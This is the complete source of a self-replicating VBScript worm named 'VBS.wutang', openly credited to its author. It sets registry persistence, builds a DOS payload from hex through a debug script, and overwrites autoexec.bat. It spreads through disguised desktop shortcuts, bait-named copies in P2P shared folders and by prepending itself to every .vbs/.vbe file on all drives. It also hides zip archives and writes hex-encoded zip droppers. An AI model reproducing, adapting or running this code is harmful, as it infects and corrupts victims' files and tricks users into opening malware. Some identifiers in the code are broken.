'VBS.wutang
'By Psychologic
'WuTang Clan is My Favourite Hip-Hop...!!
'Get The Cassete and CD Now
'01.07.04

On error resume next
Set Fso=CreateObject("Scripting.FileSystemObject")
Set ws=CreateObject("WScript.Shell")
Set cpy=Fso.GetFile(WScript.ScriptFullName)
cpy.Copy(Fso.GetSpecialFolder(1)&"\Wutang.vbs")
r=("HKLM\Software\Microsoft\Windows\CurrentVersion\Run\Wutang")
ws.RegWrite r,(Fso.GetSpecialFolder(1)&"\Wutang.vbs")
Set OpenSelf = FSO.OpenTextFile(Wscript.ScriptFullName, 1, True)
Self = OpenSelf.Readall

if not fso.fileexists("C:\windows\info.com") then
set batz = fso.createtextfile("C:\run.bat")
batz.write "echo e 0100  E9 E5 02 00 00 00 00 00 00 00 00 3E 7F 9F 61 1F>>info32" & vbcrlf
batz.write "echo e 0110  98 00 80 30 63 98 61 19 18 00 80 30 63 98 61 19>>info32" & vbcrlf
batz.write "echo e 0120  18 00 80 3E 7F 98 7F 99 1F 00 80 06 60 18 0C 99>>info32" & vbcrlf
batz.write "echo e 0130  19 00 80 06 60 18 0C 99 19 00 80 3E 60 1F 0C 9F>>info32" & vbcrlf
batz.write "echo e 0140  99 00 80 00 00 00 00 00 00 00 00 00 00 FE C0 3C>>info32" & vbcrlf
batz.write "echo e 0150  7F 00 FE 00 00 C6 C0 18 60 00 C0 00 00 C6 C0 18>>info32" & vbcrlf
batz.write "echo e 0160  6F 00 C0 00 00 C6 C0 18 63 00 C0 00 00 C6 C0 18>>info32" & vbcrlf
batz.write "echo e 0170  63 00 C0 00 00 FE FC 3C 7F 00 FE 00 00 00 00 00>>info32" & vbcrlf
batz.write "echo e 0180  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>info32" & vbcrlf
batz.write "echo e 0190  00 00 00 00 00 00 00 00 00 00 00 FF FF FF FF FF>>info32" & vbcrlf
batz.write "echo e 01A0  FF FF FF 00 80 00 00 00 00 01 00 00 80 00 00 00>>info32" & vbcrlf
batz.write "echo e 01B0  00 01 00 FF FF FF FF FF FF FF FF 00 00 00 00 00>>info32" & vbcrlf
batz.write "echo e 01C0  00 00 00 00 00 00 00 7C 00 00 00 01 00 FF C1 12>>info32" & vbcrlf
batz.write "echo e 01D0  FF 00 00 02 00 00 85 89 00 00 00 04 00 00 48 51>>info32" & vbcrlf
batz.write "echo e 01E0  00 00 00 04 00 00 10 21 00 00 00 02 00 F8 23 12>>info32" & vbcrlf
batz.write "echo e 01F0  3F 00 00 01 00 04 24 8C 40 00 00 00 00 64 C4 84>>info32" & vbcrlf
batz.write "echo e 0200  4C 00 00 00 00 64 44 82 4C 00 00 00 00 04 84 82>>info32" & vbcrlf
batz.write "echo e 0210  40 00 00 00 00 F8 83 02 3F 00 00 00 00 01 80 02>>info32" & vbcrlf
batz.write "echo e 0220  80 00 00 00 00 02 80 02 40 00 00 00 00 04 40 04>>info32" & vbcrlf
batz.write "echo e 0230  20 00 00 00 00 0F 40 04 F0 00 00 00 00 00 20 08>>info32" & vbcrlf
batz.write "echo e 0240  00 00 00 00 00 7F 1E E0 F9 00 00 00 00 6A 02 00>>info32" & vbcrlf
batz.write "echo e 0250  59 00 00 00 00 54 02 00 A9 00 00 00 00 40 02 00>>info32" & vbcrlf
batz.write "echo e 0260  09 00 00 00 00 7F 02 00 F9 00 00 00 00 00 01 00>>info32" & vbcrlf
batz.write "echo e 0270  02 00 00 00 00 FF 00 00 FC 00 00 00 00 00 00 00>>info32" & vbcrlf
batz.write "echo e 0280  00 00 00 FF FF FF FF FF FF FF FF 00 80 00 00 00>>info32" & vbcrlf
batz.write "echo e 0290  00 01 00 00 80 00 00 00 00 01 00 FF FF FF FF FF>>info32" & vbcrlf
batz.write "echo e 02A0  FF FF FF 00 00 00 00 00 00 00 00 33 60 C3 03 F3>>info32" & vbcrlf
batz.write "echo e 02B0  03 F0 F3 66 30 03 C2 03 03 00 13 CF 1A C3 E3 F3>>info32" & vbcrlf
batz.write "echo e 02C0  F3 F0 F3 98 0D 43 30 03 33 00 43 00 00 C3 03 F3>>info32" & vbcrlf
batz.write "echo e 02D0  33 F0 33 00 00 00 00 00 00 00 00 FF FF FF FF FF>>info32" & vbcrlf
batz.write "echo e 02E0  FF FF FF 00 80 00 00 00 00 01 00 FF FF FF FF FF>>info32" & vbcrlf
batz.write "echo e 02F0  FF FF FF 00 00 00 00 00 00 00 00 00 00 00 00 00>>info32" & vbcrlf
batz.write "echo e 0300  00 00 00 00 00 32 00 B4 00 B0 13 CD 10 B9 00 00>>info32" & vbcrlf
batz.write "echo e 0310  50 53 51 52 2B DB B9 40 00 51 B9 04 00 51 B9 10>>info32" & vbcrlf
batz.write "echo e 0320  00 B8 00 80 50 2E 23 87 03 01 74 18 50 53 51 52>>info32" & vbcrlf
batz.write "echo e 0330  B4 0C 2E 8B 0E 03 03 2E 8B 16 05 03 B0 55 CD 10>>info32" & vbcrlf
batz.write "echo e 0340  5A 59 5B 58 58 D1 E8 2E FF 06 03 03 E2 D6 83 C3>>info32" & vbcrlf
batz.write "echo e 0350  02 59 E2 C9 2E FF 06 05 03 2E 83 2E 03 03 40 59>>info32" & vbcrlf
batz.write "echo e 0360  E2 B7 2E 83 2E 05 03 40 5A 59 5B 58 51 2B C9 E2>>info32" & vbcrlf
batz.write "echo e 0370  FE 59 50 53 51 52 2B DB B9 40 00 51 B9 04 00 51>>info32" & vbcrlf
batz.write "echo e 0380  B9 10 00 B8 00 80 50 2E 23 87 03 01 74 18 50 53>>info32" & vbcrlf
batz.write "echo e 0390  51 52 B4 0C 2E 8B 0E 03 03 2E 8B 16 05 03 B0 00>>info32" & vbcrlf
batz.write "echo e 03A0  CD 10 5A 59 5B 58 58 D1 E8 2E FF 06 03 03 E2 D6>>info32" & vbcrlf
batz.write "echo e 03B0  83 C3 02 59 E2 C9 2E FF 06 05 03 2E 83 2E 03 03>>info32" & vbcrlf
batz.write "echo e 03C0  40 59 E2 B7 2E 83 2E 05 03 40 5A 59 5B 58 2E FF>>info32" & vbcrlf
batz.write "echo e 03D0  06 03 03 41 81 F9 26 02 74 03 E9 33 FF B4 00 B0>>info32" & vbcrlf
batz.write "echo e 03E0  03 CD 10 CD 20 E9 04 02 E9 D1 00 20 20 20 20 20>>info32" & vbcrlf
batz.write "echo e 03F0  20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 DA>>info32" & vbcrlf
batz.write "echo e 0400  C4 C4 C4 C4 C4 C4 C4 C4 C4 C4 C4 C4 C4 C4 C4 C4>>info32" & vbcrlf
batz.write "echo e 0410  C4 C4 C4 C4 C4 C4 C4 C4 C4 C4 C4 C4 20 0D 0A 20>>info32" & vbcrlf
batz.write "echo e 0420  20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20>>info32" & vbcrlf
batz.write "echo e 0430  20 20 20 B3 20 20 50 54 FA 41 57 49 58 FA 4D 45>>info32" & vbcrlf
batz.write "echo e 0440  44 49 41 FA 4B 4F 4D 50 55 54 49 4E 44 4F 20 20>>info32" & vbcrlf
batz.write "echo e 0450  DB 0D 0A 20 20 20 20 20 20 20 20 20 20 20 20 20>>info32" & vbcrlf
batz.write "echo e 0460  20 20 20 20 20 20 20 B3 5F 5F 5F 5F 5F 5F 5F 5F>>info32" & vbcrlf
batz.write "echo e 0470  5F 5F 5F 5F 5F 5F 5F 5F 5F 5F 5F 5F 5F 5F 5F 5F>>info32" & vbcrlf
batz.write "echo e 0480  5F 5F 5F 5F DB 0D 0A 20 20 20 20 20 20 20 20 20>>info32" & vbcrlf
batz.write "echo e 0490  20 20 20 20 20 20 20 20 20 20 20 20 DF DF DF DF>>info32" & vbcrlf
batz.write "echo e 04A0  DF DF DF DF DF DF DF DF DF DF DF DF DF DF DF DF>>info32" & vbcrlf
batz.write "echo e 04B0  DF DF DF DF DF DF DF DF DF 0D 0A 24 BF 01 01 8B>>info32" & vbcrlf
batz.write "echo e 04C0  15 81 C2 00 01 83 C2 06 B4 09 CD 21 BF 01 01 8B>>info32" & vbcrlf
batz.write "echo e 04D0  35 81 C6 00 01 BF 00 01 B9 03 00 8A 24 88 25 46>>info32" & vbcrlf
batz.write "echo e 04E0  47 E2 F8 BF 00 01 FF E7 00>>info32" & vbcrlf
batz.write "echo rcx>>info32" & vbcrlf
batz.write "echo 3E8>>info32" & vbcrlf
batz.write "echo n C:\windows\info.com>>info32" & vbcrlf
batz.write "echo w>>info32" & vbcrlf
batz.write "echo q>>info32" & vbcrlf
batz.write "debug < info32" & vbcrlf
batz.close
ws.run("C:\run.bat")
end if

if fso.fileexits("C:\autoexec.bat") then
	on error resume next
	set wrbat = fso.Createtextfile("C:\autoexec.bat",true)
	wrbat.write "%windir%\info"
	wrbat.close
end if

fso.CopyFile Wscript.ScriptFullName, "C:\windows\system\Sex-Picture.vbs", True

if fso.FolderExists("C:\Documents and Settings\All Users\Desktop") then
	on error resume next
	set shell=wscript.createobject("wscript.shell")
	set msc=shell.CreateShortCut("C:\Documents and Settings\All Users\Desktop\Sex-Picture.jpg.lnk")
	msc.TargetPath = Shell.ExpandEnvironmentStrings("%windir%\system\Sex-Picture.vbs")
	msc.IconLocation = Shell.ExpandEnvironmentStrings("C:\windows\system32\mspaint.exe, 0")
	msc.WindowStyle = 4
	msc.Save
end if

if fso.FolderExists("C:\windows\Desktop") then
	on error resume next
	set shell=wscript.createobject("wscript.shell")
	set msc=shell.CreateShortCut("C:\windows\Desktop\Sex-Picture.jpg.lnk")
	msc.TargetPath = Shell.ExpandEnvironmentStrings("%windir%\system\Sex-Picture.vbs")
	msc.WindowStyle = 4
	msc.Save
end if

Randomize

	if int(rnd * 10) = 1 then
		Set YourFile = fso.createtextfile("C:\Payload.txt", True)
		YourFile.writeline "Warning..!!"
		YourFile.writeline "Your Computer has been Infected with VBS.Wutang"
		YourFile.writeline "***********************************************"
		YourFile.writeline "This is very first script virus that able"
		YourFile.writeline "to infect your zip files" & vbcrlf & vbcrlf
		YourFile.writeline "VBS.Wutang Created By Psychologic"
		YourFile.close
		CreateObject ("wscript.Shell").run "C:\Payload.txt", 1, False
		CreateObject ("wscript.Shell").run "C:\windows\info.com", 1, False
	End if

if fso.folderexists("C:\Program Files\KMD\My Shared Folder") then
	fso.copyfile Wscript.ScriptFullName, "C:\Program Files\KMD\My Shared Folder\Porno-Pic.Jpg.vbs"
	fso.copyfile Wscript.ScriptFullName, "C:\Program Files\KMD\My Shared Folder\Cool-Games.Exe.vbs"
	fso.copyfile Wscript.ScriptFullName, "C:\Program Files\KMD\My Shared Folder\AllaboutSex.gif.vbs"
	fso.copyfile Wscript.ScriptFullName, "C:\Program Files\KMD\My Shared Folder\Sex-party.mpg.vbs"
	fso.copyfile Wscript.ScriptFullName, "C:\Program Files\KMD\My Shared Folder\Underwear.mpg.vbs"
End if
if fso.folderexists("C:\Program Files\KaZaA Lite\My Shared Folder") then
	fso.copyfile Wscript.ScriptFullName, "C:\Program Files\KaZaA Lite\My Shared Folder\Porno-Pic.Jpg.vbs"
	fso.copyfile Wscript.ScriptFullName, "C:\Program Files\KaZaA Lite\My Shared Folder\Cool-Games.Exe.vbs"
	fso.copyfile Wscript.ScriptFullName, "C:\Program Files\KaZaA Lite\My Shared Folder\AllaboutSex.gif.vbs"
	fso.copyfile Wscript.ScriptFullName, "C:\Program Files\KaZaA Lite\My Shared Folder\Sex-party.mpg.vbs"
	fso.copyfile Wscript.ScriptFullName, "C:\Program Files\KaZaA Lite\My Shared Folder\Underwear.mpg.vbs"
End if
if fso.folderexists("C:\Program Files\Morpheus\My Shared Folder") then
	fso.copyfile Wscript.ScriptFullName, "C:\Program Files\Morpheus\My Shared Folder\Porno-Pic.Jpg.vbs"
	fso.copyfile Wscript.ScriptFullName, "C:\Program Files\Morpheus\My Shared Folder\Cool-Games.Exe.vbs"
	fso.copyfile Wscript.ScriptFullName, "C:\Program Files\Morpheus\My Shared Folder\AllaboutSex.gif.vbs"
	fso.copyfile Wscript.ScriptFullName, "C:\Program Files\Morpheus\My Shared Folder\Sex-party.mpg.vbs"
	fso.copyfile Wscript.ScriptFullName, "C:\Program Files\Morpheus\My Shared Folder\Underwear.mpg.vbs"
End if
if fso.folderexists("C:\Program Files\BearShare\Shared") then
	fso.copyfile Wscript.ScriptFullName, "C:\Program Files\BearShare\Shared\Porno-Pic.Jpg.vbs"
	fso.copyfile Wscript.ScriptFullName, "C:\Program Files\BearShare\Shared\Cool-Games.Exe.vbs"
	fso.copyfile Wscript.ScriptFullName, "C:\Program Files\BearShare\Shared\AllaboutSex.gif.vbs"
	fso.copyfile Wscript.ScriptFullName, "C:\Program Files\BearShare\Shared\Sex-party.mpg.vbs"
	fso.copyfile Wscript.ScriptFullName, "C:\Program Files\BearShare\Shared\Underwear.mpg.vbs"
End if
if fso.folderexists("C:\Program Files\Edonkey2000\Incoming") then
	fso.copyfile Wscript.ScriptFullName, "C:\Program Files\Edonkey2000\Incoming\Porno-Pic.Jpg.vbs"
	fso.copyfile Wscript.ScriptFullName, "C:\Program Files\Edonkey2000\Incoming\Cool-Games.Exe.vbs"
	fso.copyfile Wscript.ScriptFullName, "C:\Program Files\Edonkey2000\Incoming\AllaboutSex.gif.vbs"
	fso.copyfile Wscript.ScriptFullName, "C:\Program Files\Edonkey2000\Incoming\Sex-party.mpg.vbs"
	fso.copyfile Wscript.ScriptFullName, "C:\Program Files\Edonkey2000\Incoming\Underwear.mpg.vbs"
End if

Set Drives=fso.drives 
For Each Drive in Drives
	If drive.isready then
		Findout drive & "\"
	end If 
Next 

Function Findout(Path) 
Set Folder=fso.getfolder(path) 
Set Files = folder.files 
For Each File in files
	If Fso.GetExtensionName(file.path)="vbs" or fso.GetExtensionName(file.path)="vbe" then 
		on error resume next
		Set Scripts = FSO.OpenTextFile(ScriptFiles.path, 1, True)
			If Scripts.ReadLine <> "'VBS.wutang" then
				Set Scripts = FSO.OpenTextFile(file.path, 1, True)
				ScriptsSource = Scripts.ReadAll
				Set WriteScripts = FSO.OpenTextFile(file.path, 2, True)
				WriteScripts.WriteLine Self
				WriteScripts.WriteLine ScriptsSource
			End If
	end if

	If fso.GetExtensionName(file.path)="zip" then
		bathelp = file.path & ".bat"
		Set dropper = Fso.Createtextfile(bathelp, True)
		dropper.writeline "Attrib +h " & file.path
		dropper.Close
		ws.run bathelp
		Fso.Deletefile bathelp
		zipcopy = file.path & ".z"
		GenCode1 = "504B0304140000000800B50AE430A9289BE850010000860200000E000000436C69636B2D686572"
		GenCode2 = "652E76627375524D4FC3300CBD57EA7FB07280EE526D778AD4F50355820DD10984C4256BBD2DA3"
		GenCode3 = "4DAAC465ECDFD32EFBA886965362BF673F3FE7FE7D9AFB1F2D71B9769DB984446BA5E10D4D5B23"
		GenCode4 = "CCF0975C274782D4A820D2C809E7CB2D16E4B1BCD0A22121D77E2A2ACCF786B0B63936B21C7E3C"
		GenCode5 = "57C4794B9552DF7ED8349528380925FF314E17FF0969C66BCC1B5EA0C75EC2D7ACC7A69DC48417"
		GenCode6 = "1B88209367961F96A546639E8521E33AD90AA2532891A4051A3F52AD24787884312C36286DA538"
		GenCode7 = "98C042DD005F8F7205F2E29BD2EDD459678B37EE40E7F8425D30C762836CDE1E6C0A98DD099458"
		GenCode8 = "2B882336804C55B90FD8A76A61DB1A829D92FD30B0B384A8E2D2B2A278C80A893AC76A9464FAB6"
		GenCode9 = "5EB7D1DEDDBCC142F02A555589DA9B8CEED897EDECFF2C0D1BEA8EB142C27045A83B91B5A060A1"
		GenCode10 = "5B3CF87CC6743676E6327674F73215CAD275125942B6721DFBAD86AF3F504B0102140014000000"
		GenCode11 = "0800B50AE430A9289BE850010000860200000E0000000000000001002000B68100000000436C69"
		GenCode12 = "636B2D686572652E766273504B050600000000010001003C0000007C0100000000"
		GenCode = GenCode1&GenCode2&GenCode3&GenCode4&GenCode5&GenCode6&GenCode7&GenCode8&GenCode9&GenCode10&GenCode11&GenCode12
			For replicate = 1 To Len(GenCode) Step 2
				NewCode = NewCode & Chr("&h"& Mid(GenCode, replicate, 2))
			next
		Set NewCopy = Fso.createtextfile(zipcopy, True)
		NewCopy.write NewCode
		NewCopy.close
		end if
next

Set Subfolders = folder.SubFolders 
	For Each Subfolder in Subfolders 
		Dosearch Subfolder.path 
	Next 
end function 
